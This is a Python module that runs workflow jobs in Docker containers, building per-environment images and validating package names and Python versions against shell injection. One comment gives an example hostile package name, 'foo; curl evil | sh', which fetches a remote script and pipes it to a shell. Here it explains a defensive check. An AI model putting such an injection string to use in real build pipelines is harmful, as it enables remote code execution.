"""Docker runner-pool provider (split from remote_dispatch.py, A2).

The host drives containers via the Docker SDK: an image is built per-env
(tagged ``noodle-env:{env_id}-{packages_hash}``) and each run spawns a
container with stdin/stdout piped to the ``noodle_runtime`` JSON protocol.
Self-contained — needs no WebSocket terminating in this process, so a
standalone worker (dispatch_role=worker) can execute docker-pool runs.
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from typing import Any

from app.config import settings
from app.models import RunnerPool
from app.services.executors.base import EventCallback

logger = logging.getLogger("app.services.remote_dispatch")

# RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
# the generated Dockerfile. Shell metacharacters in a package name (e.g.
# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
# admin-controlled (``environment:write``), but we validate as defence-in-depth.
# Each requirement is restricted to a PEP 508 name + optional extras + optional
# version specifiers using only characters that cannot break out of the shell
# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
_PKG_SPEC_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
)
_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")


def _validate_packages(packages: list[str]) -> list[str]:
    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
    safe: list[str] = []
    for raw in packages:
        spec = str(raw).strip()
        if not spec:
            continue
        if not _PKG_SPEC_RE.match(spec):
            raise ValueError(
                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
                "version specifiers are allowed (no shell metacharacters)"
            )
        safe.append(spec)
    return safe


def _validate_python_version(version: str) -> str:
    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
    v = str(version or "").strip()
    if not _PY_VERSION_RE.match(v):
        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
    return v


async def assign_docker_run(
    session_factory,
    run_id: str,
    pool_id: str,
    env_payload: dict,
    graph: dict,
    cache: dict | None,
    targets: list[str] | None,
    workflow_modules: list[dict],
    on_event: EventCallback,
    pause_on_approval: bool = False,
    agent_action_resume: dict | None = None,
    subworkflow_meta: dict | None = None,
) -> str:
    try:
        import docker  # type: ignore[import-untyped]  # noqa: PLC0415
    except ImportError as exc:
        raise RuntimeError(
            "Docker provider requires the 'docker' package: pip install docker"
        ) from exc

    async with session_factory() as session:
        pool = await session.get(RunnerPool, pool_id)
        cfg = pool.provider_config if pool else {}

    docker_host = cfg.get("docker_host")
    client = (
        docker.from_env()
        if not docker_host
        else docker.DockerClient(base_url=docker_host)
    )

    image_tag = (
        f"noodle-env:{env_payload.get('id', 'default')}"
        f"-{env_payload.get('packages_hash', 'latest')}"
    )
    network = cfg.get("network", "bridge")

    loop = asyncio.get_running_loop()
    # Ensure image exists (build if not) — runs in a thread executor.
    await loop.run_in_executor(
        None, ensure_docker_image, client, image_tag, env_payload
    )

    container_name = f"noodle-run-{run_id[:12]}"
    run_msg = json.dumps({
        "type": "run",
        "request_id": run_id,
        "graph": graph,
        "cache": cache or {},
        "targets": targets or [],
        "workflow_modules": workflow_modules,
        "pause_on_approval": pause_on_approval,
        "agent_action_resume": agent_action_resume or {},
        "subworkflow_meta": subworkflow_meta or {},
    }) + "\n"

    node_events: dict[str, dict] = {}
    status = "error"

    try:
        container = await loop.run_in_executor(
            None,
            lambda: client.containers.run(
                image_tag,
                detach=True,
                stdin_open=True,
                remove=False,
                name=container_name,
                network=network,
            ),
        )

        # Attach to the container and drive the noodle_runtime protocol.
        sock = await loop.run_in_executor(None, lambda: container.attach_socket(
            params={"stdin": True, "stdout": True, "stderr": False, "stream": True}
        ))

        # Write the run message to stdin.
        await loop.run_in_executor(None, sock._sock.sendall, run_msg.encode())

        # Bound the recv loop so a crashed container never hangs the caller.
        _recv_timeout = settings.workflow_run_timeout_seconds or 3600.0
        await loop.run_in_executor(
            None, sock._sock.settimeout, _recv_timeout
        )

        # Read events line by line until result.
        buf = b""
        while True:
            chunk = await loop.run_in_executor(None, sock._sock.recv, 4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                line = line.strip()
                if not line:
                    continue
                try:
                    event = json.loads(line)
                except json.JSONDecodeError:
                    continue

                etype = event.get("type")
                if etype == "ready":
                    # Send the run message now that the runtime is ready.
                    await loop.run_in_executor(None, sock._sock.sendall, run_msg.encode())
                elif etype in (
                    "node_started",
                    "node_finished",
                    "agent_action_requested",
                    "agent_tool_started",
                    "agent_tool_approval_required",
                    "agent_tool_auto_approved",
                    "agent_tool_finished",
                    "agent_action_completed",
                    "agent_tool_approval_decided",
                    "run_error",
                    "run_cancelled",
                    "module_error",
                ):
                    await on_event(event)
                    if etype == "node_finished":
                        nid = event.get("node_id")
                        if nid:
                            node_events[nid] = event
                elif etype == "result":
                    status = str(event.get("status", "error"))
                    break
            else:
                continue
            break

    except Exception as exc:  # noqa: BLE001
        logger.exception("docker run failed run_id=%s: %s", run_id, exc)
        await on_event({"type": "run_error", "error": str(exc)})
        status = "error"
    finally:
        try:
            await loop.run_in_executor(
                None,
                lambda: client.containers.get(container_name).remove(force=True),
            )
        except Exception:  # noqa: BLE001
            pass

    return status


def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
    """Build a Docker image for this env if it doesn't exist. Sync — runs in executor."""
    try:
        client.images.get(image_tag)
        return  # Cache hit
    except Exception:  # noqa: BLE001
        pass  # Image not found, build it

    python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
    packages = _validate_packages(env_payload.get("packages") or [])
    packages_str = " ".join(packages) if packages else ""
    install_line = (
        f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core {packages_str}"
        if packages_str
        else "RUN uv pip install --system noodle-runtime noodle-nodes noodle-core"
    )

    dockerfile = (
        f"FROM python:{python_version}-slim\n"
        "RUN pip install uv --quiet\n"
        f"{install_line}\n"
        'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
    )

    import io  # noqa: PLC0415
    client.images.build(
        fileobj=io.BytesIO(dockerfile.encode()),
        tag=image_tag,
        rm=True,
    )
    logger.info("built docker image %s", image_tag)
